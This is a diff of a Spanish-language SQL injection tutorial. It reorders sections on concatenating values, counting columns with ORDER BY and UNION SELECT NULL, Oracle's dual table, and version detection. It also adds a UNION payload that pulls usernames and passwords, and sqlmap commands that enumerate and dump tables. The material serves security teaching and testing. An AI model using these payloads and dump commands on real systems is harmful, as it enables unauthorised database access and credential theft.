@@ -252,80 +252,34 @@ Para realizar este ataque, debe saber que hay una tabla llamada `users` con dos 
 
 ### Recuperar múltiples valores dentro de una columna
 
+Hay veces que queremos extraer varios datos y concatenarlos entre sí, para ello usamos lo siguiente:
 
+| Motor de BBDD | Payload                                                                                           |
+| ------------- | ------------------------------------------------------------------------------------------------- |
+| Oracle        | `'foo'\|\|'bar'`                                                                                  |
+| Microsoft     | `'foo'+'bar'`                                                                                     |
+| PostgreSQL    | `'foo'\|\|'bar'`                                                                                  |
+| MySQL         | <p><code>'foo' 'bar'</code> [Esapcio entre ambos Strings]<br><code>CONCAT('foo','bar')</code></p> |
 
-## Automatizando SQLi (SQLMap)
+{% hint style="info" %}
+Ejemplo de concatenación para **Oracle**:
 
-Para detectar y explotar inyecciones SQL, existe una herramienta automatizada llamada SQLMap.
-
-### Enumeración de las bases de datos
-
-&#x20;Podemos usar el siguiente comando para enumerar bases de datos de un panel de login:
-
-```bash
-sqlmap -u http://dominio.com/login --forms --dbs --batch
+```sql
+' UNION SELECT username || '~' || password FROM users--
 ```
 
-### Enumerando las tablas de una base de datos
+Los resultados de la consulta contienen todos los nombres de usuario y contraseñas, por ejemplo:
 
-&#x20;Podemos usar el siguiente comando para enumerar tablas de una base de datos en específico. Donde "Basededatos" será el nombre de la base de datos de la que queramos enumerar las tablas:
-
-```bash
-sqlmap -u http://dominio.com/login --forms -D Basededatos --tables --batch
-```
-
-### Enumerando las columnas de una tabla
-
-Podemos usar el siguiente comando para enumerar columnas de una tabla en específico. Donde "Basededatos" será el nombre de la base de datos de la tabla y "Tablaejemplo", será el nombre de la tabla de la que queramos enumerar las columnas:
-
-<pre class="language-bash"><code class="lang-bash"><strong>sqlmap -u http://dominio.com/login --forms -D Basededatos -T Tablajemplo --columns --batch
-</strong></code></pre>
-
-### Volcado de los valores de las columnas
-
-Una vez tenemos la base de datos, la tabla y la columna, solo nos falta volcar los datos. Para ello, ejecutamos el siguiente comando. Donde "Basededatos" será el nombre de la base de datos de la tabla y "Tablaejemplo", será el nombre de la tabla y "columna1" será el nombre de la columna de la que queremos ver/volcar los datos:
-
-```bash
-sqlmap -u http://dominio.com/login --forms -D Basededatos -T Tablajemplo -C columna1,columna2 --dump --batch
-```
-
-## Enumerando tablas
-
-Para poder hacer inyecciones SQL, necesitamos saber cuantas columnas esta empleando la web por detrás, hay diferentes métodos para saberlo:
-
-* Con `order by`, con esto podemos saber cuantas columnas emplea la web dependiendo de la respuesta de la web
-
-```
-https://mitienda.com/products?categoria=Bañadores' order by 1,2-- -
-```
-
-En el caso de que la web emplee 3 tablas y ejecutasemos esa consulta, veríamos un error, sin embargo si añadimos otro más:
-
-```
-https://mitienda.com/products?categoria=Bañadores' order by 1,2,3-- -
-```
-
-Podríamos ver una respuesta diferente, en la que se produjese la inyección
-
-* Con `union select`, mediante esto podemos saber cuantas columnas emplea la web, de una manera muy similar al `order by`, solo que en este caso añadimos la palabra NULL:
-
-```
-https://mitienda.com/products?categoria=Bañadores' union select NULL,NULL-- -
-```
-
-{% hint style="danger" %}
-Oracle es algo diferente a otros tipos de BD, en el caso de que queramos probar una SQLi en una BD Oracle, debemos de especificarle una tabla la cual siempre se encuentra en las BD de Oracle que se llama `dual`, por lo que una inyección simple como esta no nos servirá:
-
-```url
-https://mitienda.com/products?categoria=Bañadores' union select NULL,NULL-- -
-```
-
-Y deberá de ser así:
-
-```url
-https://mitienda.com/products?categoria=Bañadores' union select NULL,NULL from dual-- -
+```sql
+...
+administrator~s3cure
+wiener~peter
+carlos~montoya
+...
 ```
 {% endhint %}
+
+
 
 ## Enumeración
 
@@ -365,6 +319,44 @@ https://myshop.com/filter?category=Pets' union select NULL, schema_name from inf
 ```
 
 Si de esta manera, nos muestra algún dato, solo tendremos que ir bajando de fila para que muestre otro dato diferente, eso lo hacemos cambiando el primer valor del limit Ej. `limit 1,1`, `limit 2,1`, `limit 3,1` y así sucesivamente
+{% endhint %}
+
+### Enumerando el Número de columnas
+
+Para poder hacer inyecciones SQL, necesitamos saber cuantas columnas esta empleando la web por detrás, hay diferentes métodos para saberlo:
+
+* Con `order by`, con esto podemos saber cuantas columnas emplea la web dependiendo de la respuesta de la web
+
+```
+https://mitienda.com/products?categoria=Bañadores' order by 1,2-- -
+```
+
+En el caso de que la web emplee 3 tablas y ejecutasemos esa consulta, veríamos un error, sin embargo si añadimos otro más:
+
+```
+https://mitienda.com/products?categoria=Bañadores' order by 1,2,3-- -
+```
+
+Podríamos ver una respuesta diferente, en la que se produjese la inyección
+
+* Con `union select`, mediante esto podemos saber cuantas columnas emplea la web, de una manera muy similar al `order by`, solo que en este caso añadimos la palabra NULL:
+
+```
+https://mitienda.com/products?categoria=Bañadores' union select NULL,NULL-- -
+```
+
+{% hint style="danger" %}
+Oracle es algo diferente a otros tipos de BD, en el caso de que queramos probar una SQLi en una BD Oracle, debemos de especificarle una tabla la cual siempre se encuentra en las BD de Oracle que se llama `dual`, por lo que una inyección simple como esta no nos servirá:
+
+```url
+https://mitienda.com/products?categoria=Bañadores' union select NULL,NULL-- -
+```
+
+Y deberá de ser así:
+
+```url
+https://mitienda.com/products?categoria=Bañadores' union select NULL,NULL from dual-- -
+```
 {% endhint %}
 
 ### Enumerando Tablas
@@ -519,11 +511,11 @@ Para enumerar las columnas de BBDD Oracle, lo hacemos de la siguiente forma:
 https://myshop.com/filter?category=Pets' union select NULL, column_name from all_tab_columns where table_name = 'Table_Name'-- -
 ```
 
-## Volcando tipo y versión de la BD
+### Enumeración del tipo y versión de la BD
 
 Podemos volcar el tipo y versión de la BD, una vez sepamos el numero de columnas que tiene la tabla que se esta empleando ya que necesitamos un campo vulnerable para ello, pero dependiendo de ello debemos de hacerlo de una forma u otra.
 
-### Oracle
+#### Oracle
 
 {% code fullWidth="false" %}
 ```url
@@ -537,7 +529,7 @@ https://mitienda.com/products?categoria=Bañadores' union select NULL,version fr
 ```
 {% endcode %}
 
-### Microsoft y MySQL
+#### Microsoft y MySQL
 
 {% code fullWidth="false" %}
 ```
@@ -545,7 +537,7 @@ https://mitienda.com/products?categoria=Bañadores' union select NULL,@version--
 ```
 {% endcode %}
 
-### PostgreSQL
+#### PostgreSQL
 
 {% code fullWidth="false" %}
 ```
@@ -558,3 +550,38 @@ https://mitienda.com/products?categoria=Bañadores' union select NULL,version()-
 ### Boolean Based
 
 ### Time Based
+
+## Automatizando SQLi (SQLMap)
+
+Para detectar y explotar inyecciones SQL, existe una herramienta automatizada llamada SQLMap.
+
+### Enumeración de las bases de datos
+
+&#x20;Podemos usar el siguiente comando para enumerar bases de datos de un panel de login:
+
+```bash
+sqlmap -u http://dominio.com/login --forms --dbs --batch
+```
+
+### Enumerando las tablas de una base de datos
+
+&#x20;Podemos usar el siguiente comando para enumerar tablas de una base de datos en específico. Donde "Basededatos" será el nombre de la base de datos de la que queramos enumerar las tablas:
+
+```bash
+sqlmap -u http://dominio.com/login --forms -D Basededatos --tables --batch
+```
+
+### Enumerando las columnas de una tabla
+
+Podemos usar el siguiente comando para enumerar columnas de una tabla en específico. Donde "Basededatos" será el nombre de la base de datos de la tabla y "Tablaejemplo", será el nombre de la tabla de la que queramos enumerar las columnas:
+
+<pre class="language-bash"><code class="lang-bash"><strong>sqlmap -u http://dominio.com/login --forms -D Basededatos -T Tablajemplo --columns --batch
+</strong></code></pre>
+
+### Volcado de los valores de las columnas
+
+Una vez tenemos la base de datos, la tabla y la columna, solo nos falta volcar los datos. Para ello, ejecutamos el siguiente comando. Donde "Basededatos" será el nombre de la base de datos de la tabla y "Tablaejemplo", será el nombre de la tabla y "columna1" será el nombre de la columna de la que queremos ver/volcar los datos:
+
+```bash
+sqlmap -u http://dominio.com/login --forms -D Basededatos -T Tablajemplo -C columna1,columna2 --dump --batch
+```
